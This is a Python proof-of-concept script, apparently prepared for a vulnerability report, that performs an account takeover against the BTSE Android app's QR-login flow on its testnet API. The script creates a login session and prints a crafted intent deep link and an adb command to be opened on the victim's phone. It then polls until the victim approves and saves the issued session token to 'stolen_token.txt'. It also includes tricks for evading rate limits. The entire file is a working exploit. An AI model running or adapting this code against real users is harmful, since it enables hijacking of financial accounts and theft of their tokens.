#!/usr/bin/env python3
"""
Draft E — Deep link -> QR-login approval ATO (BTSE Android, testnet)
Attacker side: run on a PC. No dependencies (python3 stdlib).

Flow:
  1. Request sessionId  -> POST /api/qr/session        (no auth)
  2. Show the deeplink to open on the victim's phone
  3. Poll               -> POST /api/qr/poll           (no auth)
     - status PENDING  : waiting
     - status SCANNED  : victim's app has AUTO-CLAIMED (opening the link = claim, no action!)
     - status SUCCESS  : victim taps Approve -> VICTIM TOKEN ISSUED
  4. Print + save the token (ATO proof)

Usage: python3 poc_deeplink_attacker.py
sessionId TTL ±180 seconds — record immediately after start.
"""
import base64
import json
import sys
import time
import uuid
import os
import urllib.request
import urllib.error

BASE = "https://testapi.btse.io"
# Split rate-limit buckets: attacker polling may go direct (runner IP)
# while the victim's app stays on the SG proxy. Empty = direct.
PROXY = os.environ.get("ATTACKER_PROXY", "").strip()


def _opener():
    if PROXY:
        return urllib.request.build_opener(
            urllib.request.ProxyHandler({"http": PROXY, "https": PROXY})
        )
    return urllib.request.build_opener()


def raw(method, url, body=None, timeout=30):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(
        url, data=data, method=method, headers={"Content-Type": "application/json"}
    )
    op = _opener()
    try:
        with op.open(req, timeout=timeout) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return -1, str(e)


def banner(ch):
    print("\n" + "=" * 64)
    print(f"  {ch}")
    print("=" * 64)


def decode_jwt(tok):
    try:
        p = tok.split(".")[1]
        p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception:
        return {}


def main():
    banner("DRAFT E PoC — QR-LOGIN APPROVAL via DEEPLINK (BTSE testnet)")

    login_token = str(uuid.uuid4())
    st, body = raw("POST", f"{BASE}/api/qr/session", {"loginToken": login_token})
    print(f"[attacker] POST /api/qr/session -> {st}")
    if st != 200:
        print(body[:300]); sys.exit(1)
    sid = json.loads(body)["data"]
    print(f"[attacker] sessionId = {sid}")
    try:
        open("poc_sid.txt", "w").write(sid)  # automatic demo-side coordination
    except OSError:
        pass

    intent_link = (
        "intent://app.btse.com/app/session/authorize?sessionId="
        + sid
        + "#Intent;scheme=app;package=com.btse.finance;end"
    )
    alt_link = f"app://app.btse.com/app/session/authorize?sessionId={sid}"

    banner("OPEN THIS LINK ON THE VICTIM'S PHONE (BTSE testnet app, login A1)")
    print(intent_link)
    print("\n(alternate variant, from any browser):")
    print(alt_link)
    print("\n[If adb is available] equivalent command:")
    print(
        f'  adb shell am start -a android.intent.action.VIEW '
        f'-d "app://app.btse.com/app/session/authorize?sessionId={sid}" com.btse.finance'
    )
    print("\n>> Record the phone screen + this PC screen now. sessionId TTL ±180 seconds.")

    deadline = time.time() + 300
    last = None
    while time.time() < deadline:
        st, body = raw(
            "POST",
            f"{BASE}/api/qr/poll",
            {
                "loginToken": login_token,
                "sessionId": sid,
                "deviceFingerprint": "_pocfp",
            },
            timeout=25,
        )
        if st != 200:
            print(f"[poll] {st}: {body[:160]}")
            time.sleep(2)
            continue
        data = json.loads(body).get("data") or {}
        status = data.get("status")
        if status != last:
            t = time.strftime("%H:%M:%S")
            if status == "SCANNED":
                banner(f"[{t}] SCANNED — victim's app AUTO-CLAIMED (no scan needed!)")
            elif status == "SUCCESS":
                banner(f"[{t}] SUCCESS — VICTIM TAPPED APPROVE -> TOKEN ISSUED")
            else:
                print(f"[{t}] status = {status}")
            last = status
        if status == "SUCCESS":
            tok = data.get("token")
            print(f"\n[ATO] username = {data.get('username')}  webIdentifier = {data.get('webIdentifier')}")
            print(f"[ATO] token  = {tok}")
            print(f"[ATO] claims = {json.dumps(decode_jwt(tok))}")
            open("stolen_token.txt", "w").write(tok or "")
            print("[ATO] saved -> stolen_token.txt")
            banner("POC COMPLETE — the victim account token is in the attacker's channel")
            return
        # light backoff to dodge testapi rate-limits (status persists server-side, nothing lost)
        time.sleep(4)

    banner("TIMEOUT (5 minutes) — run again for a new sessionId")


if __name__ == "__main__":
    main()
